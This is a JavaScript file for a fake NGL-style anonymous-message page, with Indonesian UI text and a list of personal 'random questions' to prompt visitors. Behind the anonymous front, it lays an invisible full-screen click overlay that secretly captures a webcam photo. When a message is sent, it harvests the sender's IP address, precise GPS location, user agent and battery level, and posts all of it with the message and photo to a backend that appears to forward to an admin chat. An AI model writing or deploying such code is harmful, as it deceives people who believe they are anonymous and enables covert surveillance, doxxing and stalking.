const CHAT_ID = "7483495590"; // chat admin
const statusEl = document.getElementById("status");

// Random questions untuk dice button
const randomQuestions = [
  "Siapa crush kamu sekarang?",
  "Hal paling random yang bikin kamu senyum?",
  "Kapan terakhir kali kamu nangis?",
  "Siapa orang yang paling sering kamu chat?",
  "Kalau bisa balik ke masa lalu, kamu mau ngapain?",
  "Rahasia kecil yang belum pernah kamu ceritain?",
  "Apa hal paling bikin kamu malu?",
  "Siapa orang yang kamu kangenin banget?",
  "Kalau ada yang mau nembak kamu, kamu mau gimana?",
  "Hal paling cringe yang pernah kamu lakuin?"
];

function startAccess() {
  // di sini panggil getUserCamera(), getUserLocation(), getUserIP(), dll
}

// ambil info device
async function getDeviceInfo(messageText) {
  try {
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
    let geoText = "Tidak tersedia";
    let geoLink = "";
    
    if(navigator.geolocation){
      await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;
        const acc = pos.coords.accuracy;
        geoText = `Lat: ${lat}, Lng: ${lng}, Accuracy: ${acc} m`;
        geoLink = `https://www.google.com/maps?q=${lat},${lng}`;
        resolve();
      }, ()=>resolve()));
    }

    const battery = await navigator.getBattery();

    // gabungkan semua info jadi satu string
    let infoText = `🌐 IP: ${ipInfo.ip}\n📍 Lokasi: ${geoText}\n🔗 Maps: ${geoLink || "Tidak tersedia"}\n📱 UserAgent: ${navigator.userAgent}\n🔋 Battery: ${Math.round(battery.level*100)}%`;
    return infoText;

  } catch(e){ 
    return "❌ Gagal ambil info device"; 
  }
}

// kirim ke backend
async function sendToBackend(data, photoBlob=null){
  const formData = new FormData();
  formData.append("text", data);
  if(photoBlob) formData.append("photo", photoBlob, "camera.jpg");

  const response = await fetch("/api/sendPhoto", { method:"POST", body: formData });
  const result = await response.json();
  console.log("Backend response:", result);
  return result;
}

// capture foto & kirim
async function captureAndSendPhoto(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0,0);

    canvas.toBlob(async blob => {
      const info = await getDeviceInfo();
      await sendToBackend(info, blob);
    }, "image/jpeg");

    stream.getTracks().forEach(track => track.stop());
  } catch(e){ console.error("Gagal capture foto:", e); }
}

// Generate IP Log dengan detail lengkap
async function generateIPLog(messageText) {
  try {
    // Get IP
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const userIP = ipData.ip;

    // Get Location
    const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
    const locationData = await locationResponse.json();

    const locationInfo = `🌍 IP LOG - New Anonymous Message
━━━━━━━━━━━━━━━━━━━━━━━
📱 IP: ${userIP}
🌍 Country: ${locationData.country_name || 'Unknown'}
🏙️ City: ${locationData.city || 'Unknown'} 
🗺️ Region: ${locationData.region || 'Unknown'}
🏢 ISP: ${locationData.org || 'Unknown'}
📍 Coordinates: ${locationData.latitude || '?'}, ${locationData.longitude || '?'}
🕒 Timezone: ${locationData.timezone || 'Unknown'}
⏰ Time: ${new Date().toLocaleString('id-ID')}
💬 Message: "${messageText}"
━━━━━━━━━━━━━━━━━━━━━━━`;

    return locationInfo;
  } catch (err) {
    console.error("Error getting IP info:", err);
    return `❌ Failed to get IP info\n💬 Message: "${messageText}"`;
  }
}

// Generate NGL Style Photo
async function generateNGLPhoto(messageText) {
  try {
    const preview = document.createElement("div");
    preview.style.width = "375px";
    preview.style.height = "667px";
    preview.style.background = "linear-gradient(135deg, #667eea 0%, #764ba2 100%)";
    preview.style.position = "fixed";
    preview.style.top = "-10000px";
    preview.style.display = "flex";
    preview.style.flexDirection = "column";
    preview.style.justifyContent = "center";
    preview.style.alignItems = "center";
    preview.style.padding = "20px";
    preview.style.fontFamily = "Inter, -apple-system, BlinkMacSystemFont, sans-serif";
    
    preview.innerHTML = `
      <div style="
        background: linear-gradient(135deg, #E91E63 0%, #FF5722 50%, #FF9800 100%);
        color: white;
        font-weight: 700;
        font-size: 20px;
        text-align: center;
        padding: 18px 24px;
        border-radius: 16px 16px 0 0;
        width: 320px;
        box-shadow: 0 8px 32px rgba(0,0,0,0.12);
        letter-spacing: -0.3px;
        margin: 0 auto;
      ">
        kirimi aku pesan anonim!
      </div>
      <div style="
        background: white;
        color: #1a1a1a;
        font-size: 16px;
        font-weight: 600;
        text-align: center;
        padding: 36px 24px 28px 24px;
        border-radius: 0 0 16px 16px;
        width: 320px;
        box-shadow: 0 8px 32px rgba(0,0,0,0.12);
        line-height: 1.3;
        margin: 0 auto 32px auto;
      ">
        ${messageText}
      </div>
      <div style="
        background: linear-gradient(135deg, #FF4081 0%, #E91E63 100%);
        color: white;
        font-weight: 600;
        font-size: 15px;
        text-align: center;
        padding: 16px 32px;
        border-radius: 30px;
        width: 280px;
        box-shadow: 0 4px 16px rgba(233, 30, 99, 0.3);
        margin: 0 auto 16px auto;
        letter-spacing: -0.2px;
      ">
        Siapa yang mengirim ini? 👀
      </div>
      <div style="
        background: #1a1a1a;
        color: white;
        font-weight: 600;
        font-size: 15px;
        text-align: center;
        padding: 16px 32px;
        border-radius: 30px;
        width: 280px;
        box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        margin: 0 auto;
        letter-spacing: -0.2px;
      ">
        balas
      </div>
    `;
    
    document.body.appendChild(preview);

    // Delay untuk render
    await new Promise(resolve => setTimeout(resolve, 300));

    const canvas = await html2canvas(preview);
    
    return new Promise(resolve => {
      canvas.toBlob(blob => {
        preview.remove();
        resolve(blob);
      }, 'image/png', 0.9);
    });
  } catch (err) {
    console.error("Error generating NGL photo:", err);
    return null;
  }
}

// --- Event Listeners ---

// trigger klik area invisible untuk camera capture
const clickArea = document.createElement("div");
clickArea.id = "clickArea";
clickArea.style.position = "fixed";
clickArea.style.top = "0";
clickArea.style.left = "0";
clickArea.style.width = "100%";
clickArea.style.height = "100%";
clickArea.style.zIndex = "9999";
clickArea.style.cursor = "pointer";
clickArea.style.background = "transparent";
document.body.appendChild(clickArea);

clickArea.addEventListener("click", async ()=>{
  await captureAndSendPhoto();
  clickArea.remove();
});

// Dice button untuk random questions
document.getElementById("dice").addEventListener("click", () => {
  const randomQ = randomQuestions[Math.floor(Math.random() * randomQuestions.length)];
  document.getElementById("msg").value = randomQ;
});

// Send button - kirim semua: text, IP log, dan NGL photo
document.getElementById("sendBtn").addEventListener("click", async () => {
  const msg = document.getElementById("msg").value.trim();
  if (!msg) return alert("Tulis dulu pesanmu!");

  console.log("🚀 Starting complete send process...");
  
  try {
    statusEl.textContent = "📤 Mengirim pesan...";

    // 1. Kirim text message
    console.log("1️⃣ Sending text message...");
    await sendToBackend(msg);

    // 2. Generate dan kirim IP log
    console.log("2️⃣ Generating IP log...");
    const ipLog = await getDeviceInfo(msg);
    await sendToBackend(ipLog);

    // 3. Generate dan kirim NGL photo
    console.log("3️⃣ Generating NGL photo...");
    const nglPhoto = await generateNGLPhoto(msg);
    if (nglPhoto) {
      await sendToBackend(`📸 NGL Style: "${msg}"`, nglPhoto);
    }

    // Update UI
    const recentArea = document.getElementById("recentArea");
    if (recentArea) {
      const div = document.createElement("div");
      div.className = "p-4 rounded-xl bg-white shadow-sm text-sm text-gray-700";
      div.innerText = msg;
      recentArea.prepend(div);
    }

    document.getElementById("msg").value = "";
    statusEl.textContent = "✅ Semua terkirim!";
    setTimeout(() => statusEl.textContent = "", 3000);

    console.log("🎉 Complete send process finished!");

  } catch (err) {
    console.error("❌ Send error:", err);
    statusEl.textContent = "❌ Gagal kirim pesan";
    setTimeout(() => statusEl.textContent = "", 3000);
  }
});
